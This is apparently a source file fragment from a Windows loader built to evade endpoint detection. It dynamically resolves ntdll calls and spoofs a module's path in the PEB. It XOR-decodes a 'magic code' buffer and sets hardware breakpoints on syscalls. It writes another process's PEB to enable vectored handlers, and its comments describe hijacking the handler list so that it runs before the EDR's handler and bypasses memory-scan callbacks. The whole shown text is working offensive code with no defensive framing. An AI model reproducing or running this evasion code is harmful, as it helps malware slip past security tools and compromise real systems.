    NtCreateTransaction = (NtCreateTransaction_t) _import_crucial(NtFutureTranscationStr, NtCreateTransaction_t);
    NtProtectVirtualMemory = (NtProtectVirtualMemory_t) _import_crucial(NtProtectFutureMemoryStr, NtProtectVirtualMemory_t);
    LdrLoadDll = (LdrLoadDll_t) _import_crucial(LdrLoadDllStr, LdrLoadDll_t);
    MyNtWaitForSingleObject = (NtWaitForSingleObject_t) _import_crucial(NtwaitForSingleObjectStr, NtWaitForSingleObject_t);
    MyNtQueryInformationProcess = (NtQueryInformationProcess_t) _import_crucial(NtQueryInformationProcessStr, NtQueryInformationProcess_t);
    MyRtlAddVectoredExceptionHandler = (RtlAddVectoredExceptionHandler_t) _import_crucial(RtlAddHandler, RtlAddVectoredExceptionHandler_t);
    MyRtlAddVectoredContinueHandler = (RtlAddVectoredContinueHandler_t) _import_crucial(RtlAddContinueHandler, RtlAddVectoredContinueHandler_t);
    // NtCreateSection = (NtCreateSection_t)dynamic::NotGetProcAddress(hNtdll, NtCreateFutureStr);
    // NtMapViewOfSection = (NtMapViewOfSection_t)dynamic::NotGetProcAddress(hNtdll, NtViewFutureStr);
    // NtCreateTransaction = (NtCreateTransaction_t)dynamic::NotGetProcAddress(hNtdll, NtFutureTranscationStr);
}


BOOL ChangeDllPath(HMODULE hModule, const wchar_t* newPath) {
    // Get the PEB address
    PROCESS_BASIC_INFORMATION pbi;
    ULONG len;
    NTSTATUS status = MyNtQueryInformationProcess(GetCurrentProcess(), ProcessBasicInformation, &pbi, sizeof(pbi), &len);
    if (status != 0) {
        wprintf(L"Failed to get PEB address. Status: %lx\n", status);
        return FALSE;
    }

    // Get the LDR data
    PPEB_LDR_DATA ldr = pbi.PebBaseAddress->Ldr;
    PLIST_ENTRY list = &ldr->InMemoryOrderModuleList;

    // Traverse the list to find the module
    for (PLIST_ENTRY entry = list->Flink; entry != list; entry = entry->Flink) {
        PLDR_DATA_TABLE_ENTRY_FREE dataTable = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY_FREE, InMemoryOrderLinks);
        if (dataTable->DllBase == hModule) {
            // Modify the FullDllName
            size_t newPathLen = wcslen(newPath) * sizeof(wchar_t);
            memcpy(dataTable->FullDllName.Buffer, newPath, newPathLen);
            dataTable->FullDllName.Length = (USHORT)newPathLen;
            dataTable->FullDllName.MaximumLength = (USHORT)newPathLen + sizeof(wchar_t);

            // Modify the BaseDllName if needed
            wchar_t* baseName = wcsrchr(newPath, L'\\');
            if (baseName) {
                baseName++;
                newPathLen = wcslen(baseName) * sizeof(wchar_t);
                memcpy(dataTable->BaseDllName.Buffer, baseName, newPathLen);
                dataTable->BaseDllName.Length = (USHORT)newPathLen;
                dataTable->BaseDllName.MaximumLength = (USHORT)newPathLen + sizeof(wchar_t);
            }
            return TRUE;
        }
    }

    wprintf(L"Module not found in PEB.\n");
    return FALSE;
}


/////////////////////////// Breakpoint test, TODO: 

#define NT_CREATE_THREAD_EX_SUSPENDED 1
#define NT_CREATE_THREAD_EX_ALL_ACCESS 0x001FFFFF
//Create a global entry point for the magic code
LPVOID dllEntryPoint1 = NULL;
SIZE_T dll_len = 0;

char key[16];
unsigned int r = 0;

void sUrprise(char * data, size_t data_len, char * key, size_t key_len) {
	int j;
	int b = 0;
	j = 0;
	for (int i = 0; i < data_len; i++) {
			if (j == key_len - 1) j = 0;
			b++;
			data[i] = data[i] ^ key[j];
			j++;
	}
}

// int g_bypass_method = 1; //
HANDLE g_thread_handle = NULL;
HANDLE g_thread_handle2 = NULL;
// PCONTEXT g_thread_context = NULL;

// Define NtResumeThread like : 
typedef ULONG (NTAPI *NtCreateThreadEx_t)(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, ULONG_PTR ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PVOID AttributeList);
typedef ULONG (NTAPI *NtResumeThread_t)(HANDLE ThreadHandle, PULONG SuspendCount);
NtResumeThread_t pNtResumeThread = NULL;
typedef ULONG (NTAPI *NtSetContextThread_t)(HANDLE ThreadHandle, PCONTEXT Context); 
NtSetContextThread_t pNtSetContextThread = NULL;
NtCreateThreadEx_t pNtCreateThreadEx = NULL;
NtCreateThreadEx_t pNtCreateThreadExTemp = NULL;
typedef ULONG (NTAPI *RtlUserThreadStart_t)(PTHREAD_START_ROUTINE BaseAddress, PVOID Context);
RtlUserThreadStart_t pRtlUserThreadStart = NULL;

// Define basethreadinitthunk in Kernel32.dll:
typedef ULONG (WINAPI *BaseThreadInitThunk_t)(DWORD LdrReserved, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter);
BaseThreadInitThunk_t pBaseThreadInitThunk = NULL;


BOOL SetSyscallBreakpoints(LPVOID nt_func_addr, HANDLE thread_handle, bool bRtlUserThreadStart);

typedef struct {
    unsigned int  dr0_local : 1;
    unsigned int  dr0_global : 1;
    unsigned int  dr1_local : 1;
    unsigned int  dr1_global : 1;
    unsigned int  dr2_local : 1;
    unsigned int  dr2_global : 1;
    unsigned int  dr3_local : 1;
    unsigned int  dr3_global : 1;
    unsigned int  local_enabled : 1;
    unsigned int  global_enabled : 1;
    unsigned int  reserved_10 : 1;
    unsigned int  rtm : 1;
    unsigned int  reserved_12 : 1;
    unsigned int  gd : 1;
    unsigned int  reserved_14_15 : 2;
    unsigned int  dr0_break : 2;
    unsigned int  dr0_len : 2;
    unsigned int  dr1_break : 2;
    unsigned int  dr1_len : 2;
    unsigned int  dr2_break : 2;
    unsigned int  dr2_len : 2;
    unsigned int  dr3_break : 2;
    unsigned int  dr3_len : 2;
} dr7_t;



// find the address of the syscall and retn instruction within a Nt* function
BOOL FindSyscallInstruction(LPVOID nt_func_addr, LPVOID* syscall_addr, LPVOID* syscall_ret_addr, bool bRtlUserThreadStart = FALSE, bool bBaseThreadInitThunk = FALSE) {
    BYTE* ptr = (BYTE*)nt_func_addr;

    // iterate through the native function stub to find the syscall instruction
    for (int i = 0; i < 1024; i++) {

        if(bRtlUserThreadStart) {
            // check for opcode 4C 8B C2 (mov r8, rdx) for RtlUserThreadStart
            if (ptr[i] == 0x4C && ptr[i + 1] == 0x8B && ptr[i + 2] == 0xC2) {
                printf("[+] Found mov r8, rdx at 0x%llx\n", (DWORD64)&ptr[i]);
                *syscall_addr = (LPVOID)&ptr[i+3];
                *syscall_ret_addr = (LPVOID)&ptr[i + 3];
                break;
            }
        } else if(bBaseThreadInitThunk) {
            // check for opcode 49 8B C8 (mov rcx, r8) for BaseThreadInitThunk
            if (ptr[i] == 0x49 && ptr[i + 1] == 0x8B && ptr[i + 2] == 0xC8) {
                printf("[+] Found mov rcx, r8 at 0x%llx\n", (DWORD64)&ptr[i]);
                *syscall_addr = (LPVOID)&ptr[i+3];
                *syscall_ret_addr = (LPVOID)&ptr[i + 3];
                break;
            }
        } else {
            // check for syscall opcode (FF 05)
            if (ptr[i] == 0x0F && ptr[i + 1] == 0x05) {
                printf("[+] Found syscall opcode at 0x%llx\n", (DWORD64)&ptr[i]);
                *syscall_addr = (LPVOID)&ptr[i];
                *syscall_ret_addr = (LPVOID)&ptr[i + 2];
                break;
            }    

        }

    }

    
    if (!*syscall_addr) {
        printf("[---] error: syscall instruction not found\n");
        return FALSE;
    }

    // make sure the instruction after syscall is retn
    if (**(BYTE**)syscall_ret_addr != 0xc3) {
        if(!bRtlUserThreadStart && !bBaseThreadInitThunk) {
            printf("[---] error: syscall instruction not followed by ret\n");
            return FALSE;
        } else {
            printf("[+] mov r8, rdx instruction not followed by ret, as expected \n");
        }

    }

    return TRUE;
}

// set a breakpoint on the syscall and retn instruction of a Nt* function
BOOL SetSyscallBreakpoints(LPVOID nt_func_addr, HANDLE thread_handle, bool bRtlUserThreadStart = FALSE) {
    LPVOID syscall_addr = NULL; 
    LPVOID syscall_ret_addr = NULL ;

    CONTEXT thread_context = { 0 };
    // HMODULE ntdll = GetModuleHandleA("ntdll.dll");

    if (!FindSyscallInstruction(nt_func_addr, &syscall_addr, &syscall_ret_addr, TRUE, FALSE)) {
        return FALSE;
    }
    //print syscall_addr
    // printf("[+] syscall_addr should be equal to Found mov r8, rdx: %p\n", syscall_addr);
    //print syscall_ret_addr
    // if syscall is RtlUserThreadStart, we need to break on the instruction after the syscall of NtCreateThreadEx
    if (bRtlUserThreadStart) {
        LPVOID syscall_addr_temp;

        pBaseThreadInitThunk = (BaseThreadInitThunk_t)GetProcAddress(GetModuleHandleA("kernel32.dll"), "BaseThreadInitThunk");

        if(!FindSyscallInstruction((PVOID)pBaseThreadInitThunk, &syscall_addr_temp, &syscall_ret_addr, FALSE, TRUE)) {
            return FALSE;
        } else {
            printf("[+] Syscall ret instruction for BaseThreadInitThunk at 0x%llx\n", (DWORD64)syscall_ret_addr);
        }

    }
    // print syscall_ret_addr
    printf("[+] syscall_ret_addr should be equal to previous one!!!: %p\n", syscall_ret_addr);
    thread_context.ContextFlags = CONTEXT_FULL;

    // get the current thread context (note, this must be a suspended thread)
    if (!GetThreadContext(thread_handle, &thread_context)) {
        printf("[-] GetThreadContext() failed, error: %d\n", GetLastError());
        return FALSE;
    }

    dr7_t dr7 = { 0 };

    /// dr0 - dr3 to set breakpoint as debug address registers. 
    dr7.dr0_local = 1; // set DR0 as an execute breakpoint
    dr7.dr1_local = 1; // set DR1 as an execute breakpoint

    thread_context.ContextFlags = CONTEXT_ALL;

    // print syscall_addr abd syscall_addr:
    // printf("[+] syscall_addr: %p\n", syscall_addr);
    // printf("[+] syscall_ret_addr: %p\n", syscall_ret_addr);

    thread_context.Dr0 = (DWORD64)syscall_addr;     // set DR0 to break on syscall address
    thread_context.Dr1 = (DWORD64)syscall_ret_addr; // set DR1 to break on syscall ret address
    thread_context.Dr7 = *(DWORD*)&dr7;

    // use SetThreadContext to update the debug registers
    if (!SetThreadContext(thread_handle, &thread_context)) {
        printf("SetThreadContext() failed, error: %d\n", GetLastError());
    }

    printf("Hardware breakpoints set\n");
    return TRUE;
}


void SetHardwareBreakpoint(uintptr_t addressForDr0, uintptr_t addressForDr1) {
    asm volatile (
        "movq %0, %%rax\n\t"
        "movq %%rax, %%dr0\n\t"
        "movq %1, %%rax\n\t"
        "movq %%rax, %%dr1\n\t"
        "movq %%dr7, %%rax\n\t"
        "orq $0x1, %%rax\n\t"  // Enable L0
        "orq $0x4, %%rax\n\t"  // Enable L1
        "movq %%rax, %%dr7\n\t"
        :
        : "r" (addressForDr0), "r" (addressForDr1)
        : "rax"
    );
}
// a separate thread for calling NtCreateThreadEx so we can set hardware breakpoints
//This function can be any function you would like to use as decoy and trigger to cause the exception. 
// This function can even be a trampoline code...

DWORD SetCreateThread(LPVOID param) {
    // TOGO:
    HANDLE new_thread = NULL;
    // pNtCreateThreadEx = (NtCreateThreadEx_t)dynamic::NotGetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateThreadEx");
    // pNtCreateThreadEx = (NtCreateThreadEx_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
    if (!pNtCreateThreadEx) {
        printf("[-] Failed to locate NtCreateThreadEx.\n");
        // return 1;
    } else {
        printf("[+] Located NtCreateThreadEx.\n");
    }

    //Call GetCurrentProcess:



    globalPointer = (PVOID)0X88888;
    NTSTATUS status = pNtCreateThreadEx(
        &new_thread,
        NT_CREATE_THREAD_EX_ALL_ACCESS,
        NULL,
        GetCurrentProcess(),
        // dllEntryPoint1, 
        (PVOID)globalPointer, //Decoy address
        NULL,
        NT_CREATE_THREAD_EX_SUSPENDED,
        0,
        0,
        0,
        NULL);

    g_thread_handle = new_thread;

    if (!NT_SUCCESS(status)) {
        if (status == 0xC0000156) {
            printf("[++++] Status too many secrets, error: %x\n", status);
            printf("[+] Magic will be casted. ]\n");
        } else {
            printf("[-] pNtCreateThreadEx failed, error: %x\n", status);
        }
        return -1; // Uncomment this if you need to return from a function on error
    } else {
        printf("[+] pNtCreateThreadEx success, this is to trigger the syscall breakpoint \n");
    }

    DWORD waitResult = WaitForSingleObject(new_thread, INFINITE); // Use a reasonable timeout as needed
    if (waitResult == WAIT_OBJECT_0) {
        printf("[+] magiccode execution completed\n");
    } else {
        printf("[-] magiccode execution wait failed\n");
    }


	return 0;
}

//// VEH and VEH stuffs: 

/// Some definitions for Vectored Exception Handling, they can be moved to seperate header files in folder evaders.
typedef enum _MYPROCESSINFOCLASS
{
    myProcessBasicInformation, // q: PROCESS_BASIC_INFORMATION, PROCESS_EXTENDED_BASIC_INFORMATION
    myProcessQuotaLimits, // qs: QUOTA_LIMITS, QUOTA_LIMITS_EX
    myProcessIoCounters, // q: IO_COUNTERS
    myProcessVmCounters, // q: VM_COUNTERS, VM_COUNTERS_EX, VM_COUNTERS_EX2
    myProcessTimes, // q: KERNEL_USER_TIMES
    myProcessBasePriority, // s: KPRIORITY
    myProcessRaisePriority, // s: ULONG
    myProcessDebugPort, // q: HANDLE
    myProcessExceptionPort, // s: PROCESS_EXCEPTION_PORT
    myProcessAccessToken, // s: PROCESS_ACCESS_TOKEN
    myProcessLdtInformation, // qs: PROCESS_LDT_INFORMATION // 10
    myProcessLdtSize, // s: PROCESS_LDT_SIZE
    myProcessDefaultHardErrorMode, // qs: ULONG
    myProcessIoPortHandlers, // (kernel-mode only) // PROCESS_IO_PORT_HANDLER_INFORMATION
    myProcessPooledUsageAndLimits, // q: POOLED_USAGE_AND_LIMITS
    myProcessWorkingSetWatch, // q: PROCESS_WS_WATCH_INFORMATION[]; s: void
    myProcessUserModeIOPL, // qs: ULONG (requires SeTcbPrivilege)
    myProcessEnableAlignmentFaultFixup, // s: BOOLEAN
    myProcessPriorityClass, // qs: PROCESS_PRIORITY_CLASS
    myProcessWx86Information, // qs: ULONG (requires SeTcbPrivilege) (VdmAllowed)
    myProcessHandleCount, // q: ULONG, PROCESS_HANDLE_INFORMATION // 20
    myProcessAffinityMask, // s: KAFFINITY
    myProcessPriorityBoost, // qs: ULONG
    myProcessDeviceMap, // qs: PROCESS_DEVICEMAP_INFORMATION, PROCESS_DEVICEMAP_INFORMATION_EX
    myProcessSessionInformation, // q: PROCESS_SESSION_INFORMATION
    myProcessForegroundInformation, // s: PROCESS_FOREGROUND_BACKGROUND
    myProcessWow64Information, // q: ULONG_PTR
    myProcessImageFileName, // q: UNICODE_STRING
    myProcessLUIDDeviceMapsEnabled, // q: ULONG
    myProcessBreakOnTermination, // qs: ULONG
    myProcessDebugObjectHandle, // q: HANDLE // 30
    myProcessDebugFlags, // qs: ULONG
    myProcessHandleTracing, // q: PROCESS_HANDLE_TRACING_QUERY; s: size 0 disables, otherwise enables
    myProcessIoPriority, // qs: IO_PRIORITY_HINT
    myProcessExecuteFlags, // qs: ULONG
    myProcessTlsInformation, // PROCESS_TLS_INFORMATION // ProcessResourceManagement 
    myProcessCookie, // q: ULONG
    myProcessImageInformation, // q: SECTION_IMAGE_INFORMATION
    myProcessCycleTime, // q: PROCESS_CYCLE_TIME_INFORMATION // since VISTA
    myProcessPagePriority, // q: PAGE_PRIORITY_INFORMATION
    myProcessInstrumentationCallback, // s: PVOID or PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION // 40
    myProcessThreadStackAllocation, // s: PROCESS_STACK_ALLOCATION_INFORMATION, PROCESS_STACK_ALLOCATION_INFORMATION_EX
    myProcessWorkingSetWatchEx, // q: PROCESS_WS_WATCH_INFORMATION_EX[]
    myProcessImageFileNameWin32, // q: UNICODE_STRING
    myProcessImageFileMapping, // q: HANDLE (input)
    myProcessAffinityUpdateMode, // qs: PROCESS_AFFINITY_UPDATE_MODE
    myProcessMemoryAllocationMode, // qs: PROCESS_MEMORY_ALLOCATION_MODE
    myProcessGroupInformation, // q: USHORT[]
    myProcessTokenVirtualizationEnabled, // s: ULONG
    myProcessConsoleHostProcess, // q: ULONG_PTR // ProcessOwnerInformation
    myProcessWindowInformation, // q: PROCESS_WINDOW_INFORMATION // 50
    myProcessHandleInformation, // q: PROCESS_HANDLE_SNAPSHOT_INFORMATION // since WIN8
    myProcessMitigationPolicy, // s: PROCESS_MITIGATION_POLICY_INFORMATION
    myProcessDynamicFunctionTableInformation,
    myProcessHandleCheckingMode, // qs: ULONG; s: 0 disables, otherwise enables
    myProcessKeepAliveCount, // q: PROCESS_KEEPALIVE_COUNT_INFORMATION
    myProcessRevokeFileHandles, // s: PROCESS_REVOKE_FILE_HANDLES_INFORMATION
    myProcessWorkingSetControl, // s: PROCESS_WORKING_SET_CONTROL
    myProcessHandleTable, // q: ULONG[] // since WINBLUE
    myProcessCheckStackExtentsMode, // qs: ULONG // KPROCESS->CheckStackExtents (CFG)
    myProcessCommandLineInformation, // q: UNICODE_STRING // 60
    myProcessProtectionInformation, // q: PS_PROTECTION
    myProcessMemoryExhaustion, // PROCESS_MEMORY_EXHAUSTION_INFO // since THRESHOLD
    myProcessFaultInformation, // PROCESS_FAULT_INFORMATION
    myProcessTelemetryIdInformation, // q: PROCESS_TELEMETRY_ID_INFORMATION
    myProcessCommitReleaseInformation, // PROCESS_COMMIT_RELEASE_INFORMATION
    myProcessDefaultCpuSetsInformation,
    myProcessAllowedCpuSetsInformation,
    myProcessSubsystemProcess,
    myProcessJobMemoryInformation, // q: PROCESS_JOB_MEMORY_INFO
    myProcessInPrivate, // s: void // ETW // since THRESHOLD2 // 70
    myProcessRaiseUMExceptionOnInvalidHandleClose, // qs: ULONG; s: 0 disables, otherwise enables
    myProcessIumChallengeResponse,
    myProcessChildProcessInformation, // q: PROCESS_CHILD_PROCESS_INFORMATION
    myProcessHighGraphicsPriorityInformation, // qs: BOOLEAN (requires SeTcbPrivilege)
    myProcessSubsystemInformation, // q: SUBSYSTEM_INFORMATION_TYPE // since REDSTONE2
    myProcessEnergyValues, // q: PROCESS_ENERGY_VALUES, PROCESS_EXTENDED_ENERGY_VALUES
    myProcessPowerThrottlingState, // qs: POWER_THROTTLING_PROCESS_STATE
    myProcessReserved3Information, // ProcessActivityThrottlePolicy // PROCESS_ACTIVITY_THROTTLE_POLICY
    myProcessWin32kSyscallFilterInformation, // q: WIN32K_SYSCALL_FILTER
    myProcessDisableSystemAllowedCpuSets, // 80
    myProcessWakeInformation, // PROCESS_WAKE_INFORMATION
    myProcessEnergyTrackingState, // PROCESS_ENERGY_TRACKING_STATE
    myProcessManageWritesToExecutableMemory, // MANAGE_WRITES_TO_EXECUTABLE_MEMORY // since REDSTONE3
    myProcessCaptureTrustletLiveDump,
    myProcessTelemetryCoverage,
    myProcessEnclaveInformation,
    myProcessEnableReadWriteVmLogging, // PROCESS_READWRITEVM_LOGGING_INFORMATION
    myProcessUptimeInformation, // q: PROCESS_UPTIME_INFORMATION
    myProcessImageSection, // q: HANDLE
    myProcessDebugAuthInformation, // since REDSTONE4 // 90
    myProcessSystemResourceManagement, // PROCESS_SYSTEM_RESOURCE_MANAGEMENT
    myProcessSequenceNumber, // q: ULONGLONG
    myProcessLoaderDetour, // since REDSTONE5
    myProcessSecurityDomainInformation, // PROCESS_SECURITY_DOMAIN_INFORMATION
    myProcessCombineSecurityDomainsInformation, // PROCESS_COMBINE_SECURITY_DOMAINS_INFORMATION
    myProcessEnableLogging, // PROCESS_LOGGING_INFORMATION
    myProcessLeapSecondInformation, // PROCESS_LEAP_SECOND_INFORMATION
    myProcessFiberShadowStackAllocation, // PROCESS_FIBER_SHADOW_STACK_ALLOCATION_INFORMATION // since 19H1
    myProcessFreeFiberShadowStackAllocation, // PROCESS_FREE_FIBER_SHADOW_STACK_ALLOCATION_INFORMATION
    myProcessAltSystemCallInformation, // qs: BOOLEAN (kernel-mode only) // INT2E // since 20H1 // 100
    myProcessDynamicEHContinuationTargets, // PROCESS_DYNAMIC_EH_CONTINUATION_TARGETS_INFORMATION
    myProcessDynamicEnforcedCetCompatibleRanges, // PROCESS_DYNAMIC_ENFORCED_ADDRESS_RANGE_INFORMATION // since 20H2
    myProcessCreateStateChange, // since WIN11
    myProcessApplyStateChange,
    myProcessEnableOptionalXStateFeatures,
    myMaxProcessInfoClass
} MYPROCESSINFOCLASS;

typedef struct _LDRP_VECTOR_HANDLER_LIST {
    PSRWLOCK LdrpVehLock;
    LIST_ENTRY LdrpVehList;
    PSRWLOCK LdrpVchLock;
    LIST_ENTRY LdrpVchList;
} LDRP_VECTOR_HANDLER_LIST, * PLDRP_VECTOR_HANDLER_LIST;

//VEH Struct definition for Windows 10/11 VEH and VCH entry
typedef struct _VECTXCPT_CALLOUT_ENTRY {
	LIST_ENTRY ListEntry; //pointer to the next and previous entry
	PVOID reserved; // reference counting for internal API
	int count; //??
	PVECTORED_EXCEPTION_HANDLER VectoredHandler; //encoded pointer to the handler
} VECTXCPT_CALLOUT_ENTRY, * PVECTXCPT_CALLOUT_ENTRY;

//VEH Struct definition for Windows Server VEH and VCH entry
typedef struct _VECTXCPT_CALLOUT_ENTRYSERVER {
	LIST_ENTRY ListEntry;
	PVOID reserved;
	PVECTORED_EXCEPTION_HANDLER VectoredHandler;
} VECTXCPT_CALLOUT_ENTRY_SERVER, * PVECTXCPT_CALLOUT_ENTRY_SERVER;


// Def for winodws 10/11
// 
typedef struct _VECTORED_HANDLER_LIST {
    PVOID              MutexException;
    VECTXCPT_CALLOUT_ENTRY* FirstExceptionHandler;
    VECTXCPT_CALLOUT_ENTRY* LastExceptionHandler;
    PVOID              MutexContinue;
    VECTXCPT_CALLOUT_ENTRY* FirstContinueHandler;
    VECTXCPT_CALLOUT_ENTRY* LastContinueHandler;
} VECTORED_HANDLER_LIST, * PVECTORED_HANDLER_LIST;


/// Strucutre for handlers end 

//Enable the ProcessUsingVEH bit in the CrossProcessFlags member of the designated process PEB
//Returns the ImageBaseAddress if successful
LPVOID ModifyHandlers(HANDLE hProcess, BOOL enable) {
	//Get the base address of the PEB in the designated process
	PROCESS_BASIC_INFORMATION processInfo = { 0 };
	DWORD returnLength = 0;
	NTSTATUS status = MyNtQueryInformationProcess(hProcess, myProcessBasicInformation, &processInfo, sizeof(processInfo), &returnLength);

    if(status != 0) {
        printf("[-] Failed to get PEB address. Status: %lx\n", status);

    } else {
        printf("[+] Got PEB address\n");
    }

	//Read the PEB from the designated process
	DWORD64 CrossProcessFlags = 0;
	DWORD dwBytesRead;
	PEB2 peb_copy;
	BOOL k32Success;
	k32Success = ReadProcessMemory(hProcess, processInfo.PebBaseAddress, &peb_copy, sizeof(PEB2), NULL);
	if (!k32Success) {
		printf("[-] Failed to read process PEB: %d\n", GetLastError());
	}

	//Enable VEH in our local copy and write it to the designated process
	// peb_copy.u2.CrossProcessFlags = 0x4;
	// peb_copy.u2.CrossProcessFlags = 0xc;
    if (enable) {
        // Enable the ProcessUsingVEH bit
        peb_copy.u2.CrossProcessFlags |= 0xc;
    } else {
        // Disable the ProcessUsingVEH bit
        peb_copy.u2.CrossProcessFlags &= ~0xc;
    }


	k32Success = WriteProcessMemory(hProcess, processInfo.PebBaseAddress, &peb_copy, sizeof(PEB2), NULL);
	if (!k32Success) {
		printf("[-] Failed to enable VEH in process PEB: %d\n", GetLastError());
		return NULL;
	}
	
    // checks
	dwBytesRead = 0;
	k32Success = ReadProcessMemory(hProcess, processInfo.PebBaseAddress, &peb_copy, sizeof(PEB2), NULL);
	if (!k32Success) {
		printf("[-] Failed to reread process PEB: %d\n", GetLastError());
		return NULL;
	}
    // Verify based on the action taken
    if (enable && (peb_copy.u2.CrossProcessFlags & 0xc)) {
        printf("[+] Enabled VEH and VCH in the designated process!\n");
        printf("[+] Designated Process ID: %d\n", GetProcessId(hProcess));
        return peb_copy.ImageBaseAddress;
    } else if (!enable && !(peb_copy.u2.CrossProcessFlags & 0xc)) {
        printf("[+] Disabled VEH and VCH in the designated process!\n");
        printf("[+] Designated Process ID: %d\n", GetProcessId(hProcess));
        return peb_copy.ImageBaseAddress;
    } else {
        printf("[-] Failed to modify VEH in the designated process\n");
    }
	// if (peb_copy.u2.CrossProcessFlags & 0x4) {
	// if (peb_copy.u2.CrossProcessFlags & 0xc) {
	// 	printf("[+] Enabled VEH in the designated process!\n");
    //     printf("[+] Designated Process ID: %d\n", GetProcessId(hProcess));
	// 	return peb_copy.ImageBaseAddress;
	// }
	// else {
	// 	printf("[-] Failed to enable VEH in the designated process\n");
	// }
	return NULL;

}

/// Function to manually inject Veh or Vch: 
void InjectVEHEntry();
PVOID InjectHandlerEntry(PVOID exceptionHandler, BOOL isVeh);
LONG WINAPI benignExceptionHandler(PEXCEPTION_POINTERS ExceptionInfo);
LONG WINAPI vehExceptionHandler(PEXCEPTION_POINTERS ExceptionInfo);
LONG WINAPI vchExceptionHandler(PEXCEPTION_POINTERS ExceptionInfo);

BOOL getNtdllSectionVa(PCSTR sectionName, PVOID* sectionVa, DWORD* sectionSz);
BOOL checkIfServer();
PVOID findLdrpVectorHandlerList();
PVOID findLdrpVectorContinueHandlerList();


FORCEINLINE VOID InsertHeadList(_Inout_ PLIST_ENTRY 	ListHead,
	_Inout_ PLIST_ENTRY 	Entry
)
{
	PLIST_ENTRY OldFlink;
	OldFlink = ListHead->Flink;
	Entry->Flink = OldFlink;
	Entry->Blink = ListHead;
	OldFlink->Blink = Entry;
	ListHead->Flink = Entry;
}
//This will set the new entry to just point at the list head, cutting out the rest of the list
// This is used in case, in case you are using VEH only, and VEH is used by EDR to inspect things.
// It will add your VEH before the EDR's VEH. It may cause unexpected problems. 
FORCEINLINE VOID HijackHandlerList(_Inout_ PLIST_ENTRY 	ListHead,
	_Inout_ PLIST_ENTRY 	Entry
)
{
	PLIST_ENTRY OldFlink; // Save the original first entry
	OldFlink = ListHead->Flink;  // Save the original first entry  
	Entry->Flink = ListHead; // New entry's Flink points to ListHead (self-looping in new entry) 
	Entry->Blink = ListHead;    // New entry's Blink points to ListHead (self-looping in new entry) 
	OldFlink->Blink = Entry;  // The original first entry's Blink points to the new entry. 
	ListHead->Flink = Entry; // ListHead's Flink points to the new entry (inserts new entry at head)
}

// This function will remove the hanlder entry from the handler list.
// This should be run in conjunction with remove CrossProcessFlags to clean up INSIDE the last HANDLER. 
FORCEINLINE VOID UnhijackHandlerList(_Inout_ PLIST_ENTRY ListHead, _Inout_ PLIST_ENTRY Entry)
{
    // Ensure Entry is in the list and isn't the only element in the list
    if (Entry->Flink != Entry && Entry->Blink != Entry) {
        // Reconnect the surrounding elements
        Entry->Blink->Flink = Entry->Flink;
        Entry->Flink->Blink = Entry->Blink;

        // Reset Entry's pointers to detach it completely from the list
        Entry->Flink = Entry;
        Entry->Blink = Entry;
    }
}

// Function to rotate a 64-bit value to the right
ULONG_PTR RotateRight64(ULONG_PTR value, DWORD shift) {
    return (value >> shift) | (value << (64 - shift));
}

// Function to rotate a 64-bit value to the left
ULONG_PTR RotateLeft64(ULONG_PTR value, DWORD shift) {
    return (value << shift) | (value >> (64 - shift));
}

// Function to decode an encoded pointer
PVOID DecodePointers(PVOID pointer, ULONG cookie) {
    return (PVOID)(RotateRight64((ULONG_PTR)pointer, 0x40 - (cookie & 0x3f)) ^ cookie);
}


// Function to encode a pointer
PVOID EncodePointers(PVOID pointer, ULONG cookie) {
    return (PVOID)(RotateLeft64((ULONG_PTR)pointer ^ cookie, 0x40 - (cookie & 0x3f)));
}


//This is a silly way of doing it but we need to check which struct definition we need to use
//We can check by creating a new VEH and then trying to decode the pointer as if it were a server. If it works, then it's a server. Otherwise, it's a workstation
BOOL checkIfServer() {

    /// Method 1 to get the decodedPointer: 
	PVOID dummyHandler = AddVectoredExceptionHandler(0, &benignExceptionHandler);
	// PVOID decodedPointer = DecodePointer(((PVECTXCPT_CALLOUT_ENTRY_SERVER)dummyHandler)->VectoredHandler);
    PVOID decodedPointer = DecodePointer((PVOID)((PVECTXCPT_CALLOUT_ENTRY_SERVER)dummyHandler)->VectoredHandler);

    // alternative way to do it: 
    ULONG cookie;
    ULONG ret;
    // Handle to the process 
    HANDLE hHandle = GetCurrentProcess();
    // Query the process information to get the cookie value
    MyNtQueryInformationProcess(hHandle, myProcessCookie, &cookie, sizeof(cookie), &ret);
    PVOID decodedPointer2 = DecodePointers((PVOID)((PVECTXCPT_CALLOUT_ENTRY_SERVER)dummyHandler)->VectoredHandler, cookie);
    // compare the decoded pointer values: 
    if (decodedPointer == decodedPointer2) {
        // printf("\r\n[+] Decoded pointers are the same !!!! \r\n");
    } else {
        printf("[-] Decoded pointers are different\n");
        //exitprocess:
        ExitProcess(0);
    }
    ////// end of alternative way to do it


	if (decodedPointer == &benignExceptionHandler) {
		printf("[+] Looks like this is a Windows Server\n");
	}
	else {
		printf("[+] Looks like this is a Windows Workstation\n");
	}

	/// encode the two pointers back and compare:
	PVOID encodedPointer = EncodePointer(decodedPointer);
	PVOID encodedPointer2 = EncodePointers(decodedPointer, cookie);
	if (encodedPointer == encodedPointer2) {
		// printf("\r\n[+] Encoded pointers are the same !!!! \r\n");
	} else {
		printf("[-] Encoded pointers are different\n");
        ExitProcess(0);
	}

	RemoveVectoredExceptionHandler(dummyHandler);
	return 0;
}


// Handlers:
LONG WINAPI BreakpointHandlerVch(PEXCEPTION_POINTERS e);
LONG WINAPI BreakpointHandlerVeh(PEXCEPTION_POINTERS e);
LONG WINAPI BreakpointHandlerSeh(PEXCEPTION_POINTERS e);
PVOID expHandle;
PVOID continueHandle;

LONG WINAPI BreakpointDr1Handler(PEXCEPTION_POINTERS e);

// //Method 1 can bypass both userland and kernel callback on memory scans: 
BOOL BypassHookUsingBreakpoints() {
	// set an exception handler to handle hardware breakpoints
	SetUnhandledExceptionFilter(BreakpointHandlerVch);

	// create a new thread to call SetThreadContext in a suspended state so we can modify its own context
	HANDLE new_thread = CreateThread(NULL, 0, SetCreateThread,
									 NULL, CREATE_SUSPENDED, NULL);
	if (!new_thread) {
